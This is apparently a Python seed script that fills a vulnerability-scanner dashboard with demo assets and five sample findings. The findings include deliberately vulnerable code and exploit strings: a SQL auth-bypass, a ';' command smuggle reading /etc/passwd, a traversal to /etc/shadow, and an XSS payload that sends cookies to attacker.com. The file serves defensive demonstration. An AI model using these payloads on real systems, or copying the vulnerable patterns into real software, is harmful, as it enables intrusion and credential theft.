import os
import sys
import uuid
import hashlib
import json
from datetime import datetime, timedelta

# Ensure project root is in path
root_dir = os.path.dirname(os.path.abspath(__file__))
if root_dir not in sys.path:
    sys.path.insert(0, root_dir)

from scan_engine.intel.db import create_db_and_tables, get_session
from scan_engine.intel.models import (
    VulnerabilityRecord, VulnerabilityStatus, VulnerabilityHistory, 
    ScanRecord, AssetRecord, AssetType
)
from scan_engine.intel.enrichment import EnrichmentService

def seed_enterprise_data():
    print("🚀 Initializing SecLAB Enterprise Data Seeding...")
    create_db_and_tables()
    enricher = EnrichmentService()
    
    with get_session() as session:
        # 1. Clear existing data to ensure a "neat and clean" state
        session.query(VulnerabilityHistory).delete()
        session.query(VulnerabilityRecord).delete()
        session.query(ScanRecord).delete()
        session.query(AssetRecord).delete()
        session.commit()
        print("✅ Previous telemetry purged.")

        # 2. Seed Infrastructure Assets
        assets = [
            AssetRecord(name="Global-API-Gateway", type=AssetType.SERVICE, environment="Production", coverage=99.2, posture_score=88.5, vulnerabilities_count=3, critical_vulnerabilities=1, description="Primary ingress for all enterprise API traffic."),
            AssetRecord(name="Auth-Core-Node", type=AssetType.SERVICE, environment="Production", coverage=100.0, posture_score=94.0, vulnerabilities_count=1, critical_vulnerabilities=0, description="Centralized identity and access management."),
            AssetRecord(name="Billing-DB-Proxy", type=AssetType.SERVICE, environment="Production", coverage=95.0, posture_score=72.0, vulnerabilities_count=8, critical_vulnerabilities=2, description="Database proxy for financial transaction records."),
            AssetRecord(name="CI-CD-Pipeline-Alpha", type=AssetType.REPOSITORY, environment="Staging", coverage=100.0, posture_score=91.5, vulnerabilities_count=0, critical_vulnerabilities=0, description="Main build pipeline for internal services."),
            AssetRecord(name="Experimental-LLM-Integ", type=AssetType.REPOSITORY, environment="Development", coverage=45.0, posture_score=42.0, vulnerabilities_count=12, critical_vulnerabilities=4, description="R&D branch for machine learning components."),
        ]
        for a in assets: session.add(a)
        print(f"✅ {len(assets)} Infrastructure assets deployed.")

        # 3. Define High-Fidelity Vulnerabilities
        vuln_templates = [
            {
                "type": "SQL Injection (CWE-89)",
                "severity": "CRITICAL",
                "file": "api/v1/user_auth.py",
                "lines": "45",
                "code": "def get_user(uid):\n    query = \"SELECT * FROM users WHERE id = '\" + uid + \"'\"\n    return db.execute(query)",
                "explanation": "Unsanitized user input 'uid' is directly concatenated into a SQL query string. This allows an attacker to manipulate the query structure, potentially bypassing authentication or exfiltrating sensitive database records via Boolean-based or UNION-based injection.",
                "root_cause": "Dynamic SQL construction using untrusted input without parameterization or proper escaping.",
                "exploit": "Attacker provides uid as \"' OR '1'='1\", resulting in a query that returns the first user in the database (usually admin) without a password."
            },
            {
                "type": "Command Injection (CWE-78)",
                "severity": "CRITICAL",
                "file": "utils/system_cmd.py",
                "lines": "12",
                "code": "import os\ndef ping_host(host):\n    os.system(\"ping -c 1 \" + host)",
                "explanation": "The 'host' parameter is passed directly to a system shell via os.system(). An attacker can append shell operators like ';' or '&&' followed by arbitrary commands to execute them with the privileges of the application process.",
                "root_cause": "Insecure execution of system commands using raw string concatenation of user-controlled parameters.",
                "exploit": "Attacker provides host as \"8.8.8.8 ; cat /etc/passwd\", allowing them to read sensitive system files."
            },
            {
                "type": "Insecure Deserialization (CWE-502)",
                "severity": "HIGH",
                "file": "core/session_manager.py",
                "lines": "88",
                "code": "import pickle\ndef load_session(data):\n    return pickle.loads(data)",
                "explanation": "Untrusted data is passed to pickle.loads(), which is capable of executing arbitrary code during the unpickling process. This can lead to Remote Code Execution (RCE) if an attacker can control the session cookie or data stream.",
                "root_cause": "Use of inherently unsafe deserialization methods on user-controlled input.",
                "exploit": "Attacker crafts a malicious pickle payload using the __reduce__ method to execute a shell command when loaded."
            },
            {
                "type": "Path Traversal (CWE-22)",
                "severity": "HIGH",
                "file": "app/media_server.py",
                "lines": "34",
                "code": "def get_file(filename):\n    return open('/var/www/uploads/' + filename).read()",
                "explanation": "The application fails to sanitize the 'filename' parameter, allowing an attacker to use \"../\" sequences to navigate outside the intended directory and access sensitive files on the server's filesystem.",
                "root_cause": "Direct use of user-supplied paths in file I/O operations without canonicalization or directory anchoring.",
                "exploit": "Attacker requests \"../../../../etc/shadow\" to steal system password hashes."
            },
            {
                "type": "Cross-Site Scripting (XSS) - Reflected",
                "severity": "MEDIUM",
                "file": "templates/dashboard.html",
                "lines": "156",
                "code": "<div class='greeting'>Hello, {{ user_name }}</div>",
                "explanation": "User-supplied 'user_name' is rendered directly into the HTML without proper encoding. An attacker can provide a script tag as the name to execute JS in the context of other users' browsers.",
                "root_cause": "Failure to apply context-aware output encoding on dynamic data rendered in the UI.",
                "exploit": "Attacker sends a link with user_name=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
            }
        ]

        # 4. Generate Scan Records
        scan = ScanRecord(target="ENTERPRISE_CORE_SVCS", status="SUCCESS", findings_count=len(vuln_templates), severity_breakdown=json.dumps({"CRITICAL": 2, "HIGH": 2, "MEDIUM": 1}))
        session.add(scan)
        session.commit()
        session.refresh(scan)
        print(f"✅ Master Scan Record ([{scan.id[:8]}]) generated.")

        # 5. Seed Vulnerabilities & History
        for i, t in enumerate(vuln_templates):
            # Generate stable ID based on path/line/type
            dedup_key = hashlib.md5(f"{t['file']}:{t['lines']}:{t['type']}".encode()).hexdigest()
            
            # Simulated AI Remediation
            explanation, guidance, fixed_code, exploit, root_cause = enricher._generate_ai_remediation(None, t['code'])
            
            v = VulnerabilityRecord(
                id=dedup_key,
                scan_id=scan.id,
                file_path=t['file'],
                file_name=t['file'].split('/')[-1],
                full_code=t['code'],
                vulnerable_lines=t['lines'],
                vulnerability_type=t['type'],
                severity=t['severity'],
                status=VulnerabilityStatus.DETECTED,
                risk_score=9.5 if t['severity'] == "CRITICAL" else (7.5 if t['severity'] == "HIGH" else 4.2),
                ai_explanation=t['explanation'],
                remediation_guidance="Implement parameterized interfaces (e.g., PreparedStatements for SQL) and use modern sanitization libraries.",
                exploit_scenario=t['exploit'],
                root_cause=t['root_cause'],
                exploitability=0.9 if t['severity'] == "CRITICAL" else 0.7,
                exposure=0.8,
                asset_criticality=1.0,
                business_impact="Potential core system compromise and data breach.",
                full_code_fixed=fixed_code,
                ai_reasoning_log=json.dumps([{"step": "Pattern recognition", "msg": "Identified sink in string concatenation"}, {"step": "Context Analysis", "msg": "Confirmed user input flow to DB sink"}, {"step": "Heuristic Scoring", "msg": "Calculated 9.5 risk index"}])
            )
            session.add(v)
            
            # Add some history for the chart
            h = VulnerabilityHistory(vulnerability_id=dedup_key, old_state="None", new_state="Detected", action="System Discovery", timestamp=datetime.utcnow() - timedelta(hours=i))
            session.add(h)
        
        session.commit()
        print(f"✅ {len(vuln_templates)} High-fidelity vulnerabilities synchronized.")
        print("\n🏆 DATABASE POPULATED: SecLAB Enterprise HUB is now in a 'Neat and Clean' state.")

if __name__ == "__main__":
    seed_enterprise_data()
